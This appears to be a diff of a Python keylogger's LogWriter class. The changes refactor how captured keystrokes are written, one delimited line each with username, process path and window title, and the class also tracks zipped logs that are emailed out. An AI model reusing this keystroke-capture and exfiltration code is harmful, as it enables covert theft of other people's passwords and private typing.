@@ -67,7 +67,6 @@ class LogWriter:
 	'''
 	def __init__(self, settings, cmdoptions, q):
 		
-		#self.sepKey = '|' # should move this off into the ini file. just temporarily here.
 		self.q = q
 		self.settings = settings
 		self.cmdoptions = cmdoptions
@@ -103,13 +102,13 @@ class LogWriter:
 		
 		## don't even need this anymore?
 		# Set up the subset of keys that we are going to log
-		self.asciiSubset = [8,9,10,13,27]		   #backspace, tab, line feed, carriage return, escape
-		self.asciiSubset.extend(range(32,255))	  #all normal printable chars
+		#~ self.asciiSubset = [8,9,10,13,27]		   #backspace, tab, line feed, carriage return, escape
+		#~ self.asciiSubset.extend(range(32,255))	  #all normal printable chars
 		
-		if self.settings['General']['Parse Backspace'] == True:
-			self.asciiSubset.remove(8)			  #remove backspace from allowed chars if needed
-		if self.settings['General']['Parse Escape'] == True:
-			self.asciiSubset.remove(27)			 #remove escape from allowed chars if needed
+		#~ if self.settings['General']['Parse Backspace'] == True:
+			#~ self.asciiSubset.remove(8)			  #remove backspace from allowed chars if needed
+		#~ if self.settings['General']['Parse Escape'] == True:
+			#~ self.asciiSubset.remove(27)			 #remove escape from allowed chars if needed
 
 		# todo: no need for float() typecasting, since that is now taken care by config validation
 
@@ -149,11 +148,13 @@ class LogWriter:
 
 
 	def start(self):
+		'''This is the main workhorse function.
+		Keeps popping events off the queue, and processing them, until program quits
+		'''
 		## line format:
 		## date; time (1 minute resolution); fullapppath; hwnd; username; window title; eventdata
 		##
-		## event data: ascii if normal key, escaped string if "special" key, escaped key if cvs separator
-		##
+		## event data: ascii if normal key, escaped if "special" key, escaped if csv separator
 		## self.processName = self.GetProcessNameFromHwnd(event.Window) #fullapppath
 		## hwnd = event.Window
 		## username = os.environ['USERNAME']
@@ -161,7 +162,7 @@ class LogWriter:
 		## time = time.strftime('%H%m') #is this correct? or format event.time probably...
 		## windowtitle = str(event.WindowName)
 		
-		## put the line into a list, check if all contents (except for eventdata) are equal, if so, just append eventdata to existing eventdata.
+		# Logic: put the line into a list, check if all contents (except for eventdata) are equal, if so, just append eventdata to existing eventdata. otherwise, write out the previous event list, and start a new one.
 		## on flush or on exit, make sure to write the latest dataline
 		
 		self.stopflag=False
@@ -186,10 +187,10 @@ class LogWriter:
 								self.GetProcessNameFromHwnd(event.Window), 
 								str(event.Window), 
 								os.getenv('USERNAME'), 
-								str(event.WindowName), 
+								str(event.WindowName).replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), 
 								self.ParseEventValue(event)]
-				if self.eventlist[0:6] == eventlisttmp[0:6]:
-					self.eventlist[6] = str(self.eventlist[6]) + str(eventlisttmp[6])
+				if self.eventlist[:-1] == eventlisttmp[:-1]:
+					self.eventlist[-1] = str(self.eventlist[-1]) + str(eventlisttmp[-1])
 				else:
 					self.WriteToLogFile() #write the eventlist to file, unless it's just the dummy list
 					self.eventlist = eventlisttmp
@@ -221,59 +222,15 @@ class LogWriter:
 		if event.Ascii == 0 and not (str(event.Key).endswith('shift') or str(event.Key).endswith('Capital')):
 			return('[KeyName:' + event.Key + ']')
 		
-		#~ if event.Ascii in self.asciiSubset:
-			#~ return(chr(event.Ascii))
-		#~ if event.Ascii == 13 and self.settings['General']['Add Line Feed'] == True:
-			#~ return(chr(13) + chr(10))				 #add line feed after CR,if option is set
-		
 		return(chr(event.Ascii))
 		
-		#return '' #if nothing matches, just return an empty string, to avoid appearance of "None" in the output.
-		
-	#def WriteToLogFile(self, event):
 	def WriteToLogFile(self):
-		'''Write keystroke specified in "event" object to logfile
+		'''Write the latest eventlist to logfile in one delimited line
 		'''
-		#~ loggable = self.TestForNoLog(event)	 # see if the program is in the no-log list.
-				
-		#~ if not loggable:
-			#~ if self.cmdoptions.debug: self.PrintDebug("not loggable, we are outta here\n")
-			#~ return
-		
-		#~ if self.cmdoptions.debug: self.PrintDebug("loggable, lets log it\n")
-		
-		#~ loggable = self.OpenLogFile(event) #will return true if log file has been opened without problems
-		
-		#~ if not loggable:
-			#~ self.PrintDebug("some error occurred when opening the log file. we cannot log this event. check systemlog (if specified) for details.\n")
-			#~ return
-
-		#~ if event.Ascii in self.asciiSubset:
-			#~ self.PrintStuff(chr(event.Ascii))
-		#~ if event.Ascii == 13 and self.settings['General']['Add Line Feed'] == True:
-			#~ self.PrintStuff(chr(10))				 #add line feed after CR,if option is set
-			
-		#~ #we translate all the special keys, such as arrows, backspace, into text strings for logging
-		#~ #exclude shift keys, because they are already represented (as capital letters/symbols)
-		#~ if event.Ascii == 0 and not (str(event.Key).endswith('shift') or str(event.Key).endswith('Capital')):
-			#~ self.PrintStuff('[KeyName:' + event.Key + ']')
-		
-		#~ #translate backspace into text string, if option is set.
-		#~ if event.Ascii == 8 and self.settings['General']['Parse Backspace'] == True:
-			#~ self.PrintStuff('[KeyName:' + event.Key + ']')
-		
-		#~ #translate escape into text string, if option is set.
-		#~ if event.Ascii == 27 and self.settings['General']['Parse Escape'] == True:
-			#~ self.PrintStuff('[KeyName:' + event.Key + ']')
 		
 		if self.eventlist != range(7):
-			#~ line = ""
-			#~ for item in self.eventlist:
-				#~ line = line + str(item) + self.settings['General']['Log File Field Separator']
-			#~ line = line.rstrip(self.settings['General']['Log File Field Separator']) + '\n'
 			line = self.settings['General']['Log File Field Separator'].join(self.eventlist) + "\n"
 			self.PrintStuff(line)
-		
 
 	def TestForNoLog(self, event):
 		'''This function returns False if the process name associated with an event
@@ -395,10 +352,6 @@ class LogWriter:
 		except:
 			self.PrintDebug("Error opening emaillog.txt: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\nWill email all available log zips.\n")
 		
-		#~ if not self.CheckIfZipFile(latestZipEmailed):
-			#~ self.PrintDebug("latest emailed zip filename does not match proper filename pattern. something went wrong. stopping.\n")
-			#~ return
-		
 		zipFileList = os.listdir(self.settings['General']['Log Directory'])
 		self.PrintDebug(str(zipFileList))
 		if len(zipFileList) > 0:
@@ -471,24 +424,11 @@ class LogWriter:
 			emaillog = open(os.path.join(self.settings['General']['Log Directory'], "emaillog.txt"), 'w')
 			emaillog.write(zipFileList.pop())
 			emaillog.close()
-
-	#~ def ZipAndEmailTimerAction(self):
-		#~ '''This is a timer action function that zips the logs and sends them by email.
-		
-		#~ deprecated - should delete this.
-		#~ '''
-		#~ self.PrintDebug("Sending mail to " + self.settings['E-mail']['SMTP To'] + "\n")
-		#~ self.ZipLogFiles()
-		#~ self.SendZipByEmail()
 	
 	def OpenLogFile(self, event):
 		'''Open the appropriate log file, depending on event properties and settings in .ini file.
-		Now, we only need to open the one file logfile
+		Now, we only need to open the one file delimited logfile
 		'''
-		# if the "onefile" option is set, we don't that much to do:
-		#subDirName = self.filter.sub(r'__',self.processName)
-		# Filter out any characters that are not allowed as a windows filename, just in case the user put them into the config file
-		#self.settings['General']['Log File'] = self.filter.sub(r'__',self.settings['General']['Log File'])
 		
 		# do stuff only if file is closed. if it is open, we don't have to do anything at all, just return true.
 		if self.log == None: 
@@ -510,88 +450,7 @@ class LogWriter:
 				return False
 		else:
 			return True
-
-		#~ if self.settings['General']['One File'] != 'None':
-			#~ if self.writeTarget == "":
-				#~ self.writeTarget = os.path.join(os.path.normpath(self.settings['General']['Log Directory']), os.path.normpath(self.settings['General']['One File']))
-				#~ try:
-					#~ self.log = open(self.writeTarget, 'a')
-				#~ except OSError, detail:
-					#~ if(detail.errno==17):  #if file already exists, swallow the error
-						#~ pass
-					#~ else:
-						#~ self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
-						#~ return False
-				#~ except:
-					#~ self.PrintDebug("Unexpected error: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
-					#~ return False
-				
-				#~ #write the timestamp upon opening the logfile
-				#~ if self.settings['Timestamp']['Timestamp Enable'] == True: self.WriteTimestamp()
-
-				#~ self.PrintDebug("writing to: " + self.writeTarget + "\n")
-			#~ return True
-
-		#~ # if "onefile" is not set, we start playing with the logfilenames:
-		#~ subDirName = self.filter.sub(r'__',self.processName)	  #our subdirname is the full path of the process owning the hwnd, filtered.
-		#~ subDirName = subDirName.decode(sys.getfilesystemencoding())
 		
-		#~ WindowName = self.filter.sub(r'__',str(event.WindowName))
-		
-		#~ filename = time.strftime('%Y%m%d') + "_" + str(event.Window) + "_" + WindowName + ".txt"
-		#~ filename = filename.decode(sys.getfilesystemencoding())
-		
-		#~ #make sure our filename plus path is not longer than 255 characters, as per filesystem limit.
-		#~ #filename = filename[0:200] + ".txt"	 
-		#~ if len(os.path.join(self.settings['General']['Log Directory'], subDirName, filename)) > 255:
-			#~ if len(os.path.join(self.settings['General']['Log Directory'], subDirName)) > 250:
-				#~ self.PrintDebug("root log dir + subdirname is longer than 250. cannot log.")
-				#~ return False
-			#~ else:
-				#~ filename = filename[0:255-len(os.path.join(self.settings['General']['Log Directory'], subDirName))-4] + ".txt"  
-		
-
-		#~ #we have this writetarget conditional to make sure we dont keep opening and closing the log file when all inputs are going
-		#~ #into the same log file. so, when our new writetarget is the same as the previous one, we just write to the same 
-		#~ #already-opened file.
-		#~ if self.writeTarget != os.path.join(self.settings['General']['Log Directory'], subDirName, filename): 
-			#~ if self.writeTarget != "":
-				#~ self.FlushLogWriteBuffers("flushing and closing old log\n")
-				## self.PrintDebug("flushing and closing old log\n")
-				## self.log.flush()
-				#~ self.log.close()
-			#~ self.writeTarget = os.path.join(self.settings['General']['Log Directory'], subDirName, filename)
-			#~ self.PrintDebug("writeTarget:" + self.writeTarget + "\n")
-			
-			#~ try:
-				#~ os.makedirs(os.path.join(self.settings['General']['Log Directory'], subDirName), 0777)
-			#~ except OSError, detail:
-				#~ if(detail.errno==17):  #if directory already exists, swallow the error
-					#~ pass
-				#~ else:
-					#~ self.PrintDebug(sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
-					#~ return False
-			#~ except:
-				#~ self.PrintDebug("Unexpected error: " + sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
-				#~ return False
-
-			#~ try:
-				#~ self.log = open(self.writeTarget, 'a')
-			#~ except OSError, detail:
-				#~ if(detail.errno==17):  #if file already exists, swallow the error
-					#~ pass
-				#~ else:
-					#~ self.PrintDebug(sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
-					#~ return False
-			#~ except:
-				#~ self.PrintDebug("Unexpected error: " + sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
-				#~ return False
-			
-			#~ #write the timestamp upon opening a new logfile
-			#~ if self.settings['Timestamp']['Timestamp Enable'] == True: self.WriteTimestamp()
-		
-		#~ return True
-
 	def PrintStuff(self, stuff):
 		'''Write stuff to log, or to debug outputs.
 		'''
